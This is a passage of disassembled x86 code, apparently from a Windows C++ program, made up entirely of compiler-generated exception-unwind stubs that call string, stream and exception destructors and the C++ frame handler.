sub_432a4d
mov ecx [ ebp - 0xa4 ]
add ecx 0x2c
jmp sub_426000
sub_432a5b
lea ecx [ ebp - 0xa0 ]
jmp [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
sub_432a67
mov ecx [ ebp - 0xb0 ]
jmp sub_425dd0
sub_432a72
mov ecx [ ebp - 0xb0 ]
jmp sub_427910
sub_432a7d
mov eax r--data
jmp __CxxFrameHandler
sub_432a90
mov ecx [ ebp - 0x10 ]
jmp sub_427910
sub_432a98
mov eax r--data
jmp __CxxFrameHandler
sub_432ab0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432abc
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_427940
sub_432ac7
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_426000
sub_432ad2
mov eax r--data
jmp __CxxFrameHandler
sub_432ae0
lea ecx [ ebp - 0x14 ]
jmp sub_41a780
sub_432ae8
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_432af3
mov eax r--data
jmp __CxxFrameHandler
sub_432b00
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432b1a
mov eax r--data
jmp __CxxFrameHandler
sub_432b30
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432b39
lea ecx [ ebp - 0x48 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432b42
mov eax [ ebp - 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432b5c
mov eax r--data
jmp __CxxFrameHandler
sub_432b70
lea ecx [ ebp - 0xf4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432b7c
lea ecx [ ebp - 0x110 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432b88
mov eax [ ebp - 0x11c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x11c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432ba8
mov eax r--data
jmp __CxxFrameHandler
sub_432bc0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432bc9
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432be3
mov eax r--data
jmp __CxxFrameHandler
sub_432bf0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432bf9
lea ecx [ ebp - 0x48 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c02
mov eax [ ebp - 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c1c
mov eax r--data
jmp __CxxFrameHandler
sub_432c30
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c39
lea ecx [ ebp - 0x70 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c42
mov eax [ ebp - 0x74 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x74 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c5c
mov eax r--data
jmp __CxxFrameHandler
sub_432c70
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_432c7e
mov eax [ ebp - 0x21c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x21c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432c9e
mov eax r--data
jmp __CxxFrameHandler
sub_432cb0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_432cbe
mov eax [ ebp - 0x21c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x21c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432cde
mov eax r--data
jmp __CxxFrameHandler
sub_432cf0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432cf9
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432d13
mov eax r--data
jmp __CxxFrameHandler
sub_432d20
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432d29
mov eax r--data
jmp __CxxFrameHandler
sub_432d40
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432d49
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432d63
mov eax r--data
jmp __CxxFrameHandler
sub_432d70
lea ecx [ ebp - 0x834 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_432d7c
mov eax r--data
jmp __CxxFrameHandler
sub_432d90
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432daa
mov eax r--data
jmp __CxxFrameHandler
sub_432dc0
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432dda
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432de3
mov eax r--data
jmp __CxxFrameHandler
sub_432df0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432df9
mov eax [ ebp - 0x40 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x40 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432e13
mov eax r--data
jmp __CxxFrameHandler
sub_432e20
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432e29
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432e43
mov eax r--data
jmp __CxxFrameHandler
sub_432e50
mov eax [ ebp - 0x24 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432e6a
mov eax r--data
jmp __CxxFrameHandler
sub_432e80
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432e9a
mov eax r--data
jmp __CxxFrameHandler
sub_432eb0
mov eax [ ebp - 0x24 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432eca
mov eax r--data
jmp __CxxFrameHandler
sub_432ee0
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432efa
mov eax r--data
jmp __CxxFrameHandler
sub_432f10
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f19
lea ecx [ ebp - 0x5c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f22
mov eax [ ebp - 0x60 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x60 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f3c
mov eax r--data
jmp __CxxFrameHandler
sub_432f50
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f59
lea ecx [ ebp - 0x48 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f62
mov eax [ ebp - 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f7c
mov eax r--data
jmp __CxxFrameHandler
sub_432f90
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432f99
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432fb3
mov eax r--data
jmp __CxxFrameHandler
sub_432fc0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432fc9
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432fe3
mov eax r--data
jmp __CxxFrameHandler
sub_432ff0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_432ff9
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433013
mov eax r--data
jmp __CxxFrameHandler
sub_433020
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433029
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433043
mov eax r--data
jmp __CxxFrameHandler
sub_433050
mov eax [ ebp - 0x64 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43306a
mov eax r--data
jmp __CxxFrameHandler
sub_433080
mov eax [ ebp - 0x64 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43309a
mov eax r--data
jmp __CxxFrameHandler
sub_4330b0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4330ca
mov eax r--data
jmp __CxxFrameHandler
sub_4330e0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4330fa
mov eax r--data
jmp __CxxFrameHandler
sub_433110
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43312a
mov eax r--data
jmp __CxxFrameHandler
sub_433140
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43315a
mov eax r--data
jmp __CxxFrameHandler
sub_433170
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_433179
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433185
mov eax r--data
jmp __CxxFrameHandler
sub_433190
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_433199
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4331a5
mov eax r--data
jmp __CxxFrameHandler
sub_4331b0
mov eax [ ebp - 0x430 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x430 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4331d0
lea ecx [ ebp - 0x42c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4331dc
mov eax r--data
jmp __CxxFrameHandler
sub_4331f0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43320a
mov eax r--data
jmp __CxxFrameHandler
sub_433220
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43323a
mov eax r--data
jmp __CxxFrameHandler
sub_433250
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43326a
mov eax r--data
jmp __CxxFrameHandler
sub_433280
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43329a
mov eax r--data
jmp __CxxFrameHandler
sub_4332b0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4332ca
mov eax r--data
jmp __CxxFrameHandler
sub_4332e0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4332fa
mov eax r--data
jmp __CxxFrameHandler
sub_433310
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43332a
mov eax r--data
jmp __CxxFrameHandler
sub_433340
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43335a
mov eax r--data
jmp __CxxFrameHandler
sub_433370
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43338a
mov eax r--data
jmp __CxxFrameHandler
sub_4333a0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4333ba
mov eax r--data
jmp __CxxFrameHandler
sub_4333d0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4333ea
mov eax r--data
jmp __CxxFrameHandler
sub_433400
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433409
lea ecx [ ebp - 0x44 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433412
lea ecx [ ebp - 0x60 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43341b
mov eax [ ebp - 0x64 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433435
mov eax r--data
jmp __CxxFrameHandler
sub_433440
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433449
mov eax r--data
jmp __CxxFrameHandler
sub_433460
mov ecx [ ebp - 0x10 ]
jmp [ exception::~exception@IAT ]
sub_433469
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433475
mov eax r--data
jmp __CxxFrameHandler
sub_433480
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43349a
mov eax r--data
jmp __CxxFrameHandler
sub_4334b0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4334ca
mov eax r--data
jmp __CxxFrameHandler
sub_4334e0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4334fa
mov eax r--data
jmp __CxxFrameHandler
sub_433510
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43352a
mov eax r--data
jmp __CxxFrameHandler
sub_433540
lea ecx [ ebp - 0x258 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43354c
lea ecx [ ebp - 0x23c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_433558
mov eax r--data
jmp __CxxFrameHandler
sub_433570
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_43357e
mov eax r--data
jmp __CxxFrameHandler
sub_433590
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43359b
mov eax r--data
jmp __CxxFrameHandler
sub_4335b0
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4335bb
mov eax r--data
jmp __CxxFrameHandler
sub_4335d0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_4335de
mov eax r--data
jmp __CxxFrameHandler
sub_4335f0
mov eax [ ebp - 0x10 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4335fb
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_42b7f0
sub_433614
mov eax r--data
jmp __CxxFrameHandler
sub_433620
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp j_sub_42bab0
sub_433639
mov eax [ ebp + 0x8 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_433644
mov eax r--data
jmp __CxxFrameHandler
sub_433650
lea ecx [ ebp - 0x1c0 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43365c
lea ecx [ ebp - 0x1c0 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433668
lea ecx [ ebp - 0x1a4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433674
lea ecx [ ebp - 0x110 ]
jmp sub_401d80
sub_43367f
lea ecx [ ebp - 0x1c0 ]
jmp j_sub_41b5e0
sub_43368a
lea ecx [ ebp - 0x1a4 ]
